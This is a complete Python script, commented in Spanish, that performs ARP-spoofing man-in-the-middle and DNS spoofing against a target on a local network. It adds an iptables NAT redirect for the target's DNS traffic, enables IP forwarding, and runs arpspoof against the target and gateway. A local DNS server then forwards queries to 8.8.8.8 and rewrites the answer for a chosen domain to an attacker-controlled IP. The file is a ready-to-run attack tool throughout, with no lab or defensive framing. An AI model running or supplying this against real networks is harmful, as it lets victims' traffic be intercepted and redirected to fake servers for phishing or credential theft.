#!/bin/python3

import socket
import sys
import threading
import subprocess
import iptc
import dnslib


def network_setup(target_host, gateway_host):
	#Se construye la regla de NAT para modificar el destino:
	pkt_rule = {'protocol': 'udp',
				'src': '{:s}/32'.format(target_host),
				'udp': {'dport': '53'},
				'target': 'REDIRECT'
	}

	#Se aplica la regla en iptables (legacy):
	iptc.easy.insert_rule('nat', 'PREROUTING', pkt_rule)

	#Se pone la maquina en modo router, la salida y los errores no se muestran,
	#luego se ejecuta un MiTM con arpspoof
	rmode_cmd = "echo 1 > /proc/sys/net/ipv4/ip_forward"
	subprocess.call(rmode_cmd,
					shell=True, 
		            stdout=subprocess.DEVNULL,
		            stderr=subprocess.DEVNULL
	)

	mitm_cmd = "arpspoof -t {:s} {:s} -r".format(target_host, gateway_host)
	subprocess.call(mitm_cmd,
					shell=True, 
		            stdout=subprocess.DEVNULL,
		            stderr=subprocess.DEVNULL
	)


#Función apara procesar las respuestas de google y que luego
#se envían al usuario, se busca que el encabezado sea de tipo 
#respuesta y que el dominio resuelto sea el mismo que se debe 
#suplantar:

def process_dns_request(raw_request, domain, spfaddr) -> bytes:
	req = dnslib.DNSRecord.parse(raw_request)
	if req.header.get_qr() and b'.'.join(req.a.rname.label) == domain:
		req.header.a = 1
		req.rr = [req.rr[0]]
		req.a.rdata = dnslib.dns.A(spfaddr) #Modificacion de IP
		req.a.rtype = 0x1 #Modificacion de tipo de registro
	
	return req.pack() #Empaquetado del encabezado en bytes


#Funcion para solicitar a 8.8.8.8 la resolucion DNS del cliente
#se realizan cuatro intentos si hay timeout como respuesta
def resolve_dns(req_data) -> bytes:
	remote_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	remote_sock.settimeout(2)
	attempts = 0
	response_data = b''

	while attempts < 4:
		try:
			remote_sock.sendto(req_data, ('8.8.8.8', 53))
			response_data, server_addr = remote_sock.recvfrom(4096)
			remote_sock.close()
			break
		except socket.timeout:
			attempts += 1
			print(attempts)

	return response_data
	

def init_udp_server():
	#Variables para almacenar los datos que se ingresan por CLI:
	fserver = sys.argv[1]
	rdomain = sys.argv[2].encode()

	#Creacion del socket para el servidor local:
	local_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	local_sock.bind(('0.0.0.0', 53))

	while True:
		#Se coloca el servidor DNS local en modo escucha:
		request_data, client_addr = local_sock.recvfrom(4096)

		#Se crea una sesión con el servidor DNS de google:
		#y se envia al cliente la respuesta DNS modificada si existe:
		if dns_resp := resolve_dns(request_data):
			spf_response = process_dns_request(dns_resp, rdomain, fserver)
			local_sock.sendto(spf_response, client_addr)


def main():
	if len(sys.argv) != 5:
		print("USAGE: {:} [LOCAL_ADDRESS] [DOMAIN_TO_SPOOF] \
			   [TARGET] [GATEWAY]".format(sys.argv[0]))
		sys.exit(1)

	targeth = sys.argv[3]
	gateway = sys.argv[4]

	net_thread = threading.Thread(target=network_setup, args=(targeth, gateway))
	net_thread.start()

	init_udp_server()

if __name__ == '__main__':
	main()
